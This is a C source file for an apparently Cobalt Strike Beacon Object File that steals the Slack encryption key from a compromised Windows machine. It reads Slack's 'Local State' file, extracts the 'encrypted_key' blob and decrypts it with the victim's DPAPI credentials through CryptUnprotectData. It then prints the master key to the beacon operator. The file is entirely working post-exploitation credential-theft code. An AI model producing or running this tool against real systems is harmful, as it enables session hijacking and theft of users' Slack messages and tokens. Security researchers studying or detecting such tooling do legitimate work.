
#define SECURITY_WIN32
#include <windows.h>
#include <dpapi.h>
#include <shlwapi.h>
#include <shlobj.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"


typedef unsigned int uint32_t;


__attribute__ ((section (".data"))) static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/' };
__attribute__ ((section (".data"))) static char* decoding_table = NULL;
__attribute__ ((section (".data"))) static int mod_table[] = { 0, 2, 1 };

DWORD build_decoding_table()
{

    DWORD dwErrorCode = ERROR_SUCCESS;

    decoding_table = (char *)intAlloc(256);
    if(NULL == decoding_table)
    {
        dwErrorCode = ERROR_OUTOFMEMORY;
        internal_printf("intAlloc failed.\n");
		goto build_decoding_table_end;
    }

    for (int i = 0; i < 64; i++)
    {
        decoding_table[(unsigned char)encoding_table[i]] = i;
    }

build_decoding_table_end:

    return dwErrorCode;
}

unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    unsigned char* decoded_data = NULL;

    if (NULL == decoding_table)
    {
        dwErrorCode = build_decoding_table();
        if(ERROR_SUCCESS != dwErrorCode)
        {
            internal_printf("build_decoding_table failed (%lX)\n", dwErrorCode);
		    goto base64_decode_end;
        }
    }

    // Check input size to make sure it is block aligned
    if (input_length % 4 != 0)
    {
        internal_printf("Bad input_length\n");
        goto base64_decode_end;
    }

    // Remove padding
    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*output_length)--;
    if (data[input_length - 2] == '=') (*output_length)--;

    // Allocate decoded buffer
    decoded_data = (unsigned char *)intAlloc(*output_length);
    if (decoded_data == NULL)
    {
        internal_printf("intAlloc failed\n");
        goto base64_decode_end;
    }

    // Loop over blocks and decode
    for (int i = 0, j = 0; i < input_length;)
    {
        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

        uint32_t triple = (sextet_a << 3 * 6)
            + (sextet_b << 2 * 6)
            + (sextet_c << 1 * 6)
            + (sextet_d << 0 * 6);

        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }

base64_decode_end:

    return decoded_data;
}

void base64_cleanup()
{
    if(decoding_table)
    {
        intFree(decoding_table);
        decoding_table = NULL;
    }
}

char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length)
{
    char* encoded_data = NULL;

    // Determine encoded length
    *output_length = 4 * ((input_length + 2) / 3);

    // Allocate buffer for encoded output
    encoded_data = (char *)intAlloc(*output_length + 1);
    if (encoded_data == NULL)
    {
        internal_printf("intAlloc failed\n");
        goto base64_encode_end;
    }

    // Loop through input blocks and encode
    for (int i = 0, j = 0; i < input_length;)
    {
        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }

    // Add padding
    for (int i = 0; i < mod_table[input_length % 3]; i++)
    {
        encoded_data[*output_length - 1 - i] = '=';
    }

base64_encode_end:

    return encoded_data;
}


DWORD chromeKey(const char *encoded_data, long decode_size)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    //long decode_size = strlen(encoded_data);
    unsigned char* decoded_data = NULL;
    char *encoded = NULL;
    DATA_BLOB DataOut = {0};
    DATA_BLOB DataVerify = {0};
    LPWSTR pDescrOut = NULL;

    decoded_data = base64_decode(encoded_data, decode_size, (size_t*)&decode_size);
	if (decoded_data == NULL)
    {
        dwErrorCode = ERROR_DS_DECODING_ERROR;
		internal_printf("base64_decode failed\n");
        goto chromeKey_end;
	}

	if (decode_size < 5)
    {
		dwErrorCode = ERROR_DS_DECODING_ERROR;
		internal_printf("base64_decode failed\n");
        goto chromeKey_end;
	}

	if (decoded_data[0] != 'D' && decoded_data[1] != 'P')
    {
		dwErrorCode = ERROR_DS_DECODING_ERROR;
		internal_printf("base64_decode failed\n");
        goto chromeKey_end;
	}

    DataOut.pbData = decoded_data + 5;
    DataOut.cbData = decode_size - 5;

    if (!CRYPT32$CryptUnprotectData(
        &DataOut,
        &pDescrOut,
        NULL,
        NULL,
        NULL,
        0,
        &DataVerify))
    {
        dwErrorCode = ERROR_DECRYPTION_FAILED;
        internal_printf("CryptUnprotectData failed\n");
		goto chromeKey_end;
    }

	encoded = base64_encode(DataVerify.pbData, DataVerify.cbData, (size_t *)&decode_size);
	if (encoded == NULL)
    {
		dwErrorCode = ERROR_DS_ENCODING_ERROR;
		internal_printf("base64_encode failed\n");
        goto chromeKey_end;
	}
    
	internal_printf("Decoded key as: %s\n", encoded);
    
chromeKey_end:

    if(encoded)
    {
        intFree(encoded);
        encoded = NULL;
    }

    if(decoded_data) 
    {
        intFree(decoded_data);
        decoded_data = NULL;
    }

    if(DataVerify.pbData)
    {
        KERNEL32$LocalFree(DataVerify.pbData);
        DataVerify.pbData = NULL;
    }

    return dwErrorCode;
}


DWORD findKeyBlob(LPCWSTR path)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    HANDLE fp = NULL;
    DWORD filesize = 0;
    DWORD read = 0, totalread = 0;
    BYTE * filedata = 0, *key = 0;
    char * start = NULL;
    char * end = NULL;
    DWORD keylen = 0;

    fp = KERNEL32$CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(fp == INVALID_HANDLE_VALUE)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("CreateFileW failed %lX\n", dwErrorCode);
        goto findKeyBlob_end;
    }

    filesize = KERNEL32$GetFileSize(fp, NULL); // this won't be over 4GB
    if(filesize == INVALID_FILE_SIZE)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("GetFileSize failed %lX\n", dwErrorCode);
        goto findKeyBlob_end;
    }

    filedata = intAlloc(filesize);
    if (NULL == filedata)
    {
        dwErrorCode = ERROR_OUTOFMEMORY;
        internal_printf("intAlloc failed %lX\n", dwErrorCode);
        goto findKeyBlob_end;
    }

    while(totalread != filesize)
    {
        if(!KERNEL32$ReadFile(fp, filedata + totalread, filesize - totalread, &read, NULL))
        {
            dwErrorCode = KERNEL32$GetLastError();
            internal_printf("ReadFile failed %lX\n", dwErrorCode);
            goto findKeyBlob_end;
        }
        totalread += read;
        read = 0;
    }

    //now we need to find our key
    start = SHLWAPI$StrStrA((char *)filedata, "encrypted_key");
    if(start == NULL)
    {
        dwErrorCode = ERROR_BAD_FILE_TYPE;
        internal_printf("StrStrA failed %lX\n", dwErrorCode);
        internal_printf("Could not find start of encrypted_key in \"%S\", may be an old version\n", path);
        goto findKeyBlob_end;
    }
    start += 16; //gets us to start of base64 string;

    end = SHLWAPI$StrStrA(start, "\"}"); 
    if(end == NULL)
    {
        dwErrorCode = ERROR_BAD_FILE_TYPE;
        internal_printf("StrStrA failed %lX\n", dwErrorCode);
        internal_printf("Could not find end of encrypted_key in \"%S\", may be an old version\n", path);
        goto findKeyBlob_end;
    }
    keylen = end - start;

    key = intAlloc(keylen + 1); // chromeKey expects this to be null terminated
    if(key == NULL)
    {
        dwErrorCode = ERROR_OUTOFMEMORY;
        internal_printf("intAlloc failed %lX\n", dwErrorCode);
        goto findKeyBlob_end;
    }

    memcpy(key, start, keylen);

    internal_printf("Base64 key for %S =\n%s\n", path, key);

    dwErrorCode = chromeKey((char *)key, keylen);
    if( ERROR_SUCCESS != dwErrorCode )
    {
        internal_printf("chromeKey failed %lX\n", dwErrorCode);
        goto findKeyBlob_end;
    }
    

findKeyBlob_end:

    if(filedata)
    {
        intFree(filedata);
        filedata = NULL;
    }

    if(key)
    {
        intFree(key);
        key = NULL;
    }

    if((fp != NULL)&&(fp != INVALID_HANDLE_VALUE))
    {
        KERNEL32$CloseHandle(fp);
        fp = NULL;
    }

    return dwErrorCode;
}


//If slack is installed check it

DWORD findKeyFiles()
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    DWORD dwslackErrorCode = ERROR_SUCCESS;


	wchar_t appdata[MAX_PATH] = {0};
	wchar_t slack[MAX_PATH] = { 0 };

	
    if ( 0 == KERNEL32$ExpandEnvironmentStringsW(L"%APPDATA%", appdata, MAX_PATH) )
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("ReadFile failed %lX\n", dwErrorCode);
        goto findKeyFiles_end;
    }
	if ( NULL == SHLWAPI$PathCombineW(slack, appdata, L"Slack\\Local State") )
    {
        dwErrorCode = ERROR_BAD_PATHNAME;
        internal_printf("PathCombineW failed %lX\n", dwErrorCode);
        goto findKeyFiles_end;
    }
    
    if(SHLWAPI$PathFileExistsW(slack))
    {
        dwslackErrorCode = findKeyBlob(slack);
        if (ERROR_SUCCESS != dwslackErrorCode)
        {
            internal_printf("findKeyBlob(slack) failed %lX\n", dwslackErrorCode);
            //goto findKeyFiles_end;
        }
    }
    else
    {
        internal_printf("Could not find chrome's local state file\n");
    }
    
  

    dwErrorCode = dwslackErrorCode;
    
findKeyFiles_end:

    return dwErrorCode;
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    DWORD dwErrorCode = ERROR_SUCCESS;
	datap parser;

    BeaconDataParse(&parser, Buffer, Length);

    if(!bofstart())
    {
        return;
    }
    
    internal_printf("findKeyFiles\n");

    dwErrorCode = findKeyFiles();
    if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "findKeyFiles failed: %lX\n", dwErrorCode);
		goto go_end;
	}

	internal_printf("SUCCESS.\n");

go_end:

	printoutput(TRUE);
	
	if (decoding_table != NULL) base64_cleanup();

	bofstop();
};
#else
int main()
{
    DWORD  dwErrorCode       = ERROR_SUCCESS;
	
	internal_printf("findKeyFiles\n");

	dwErrorCode = findKeyFiles();
	if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "findKeyFiles failed: %lX\n", dwErrorCode);
		goto main_end;
	}

	internal_printf("SUCCESS.\n");

main_end:

    if (decoding_table != NULL) base64_cleanup();

	return dwErrorCode;
}
#endif
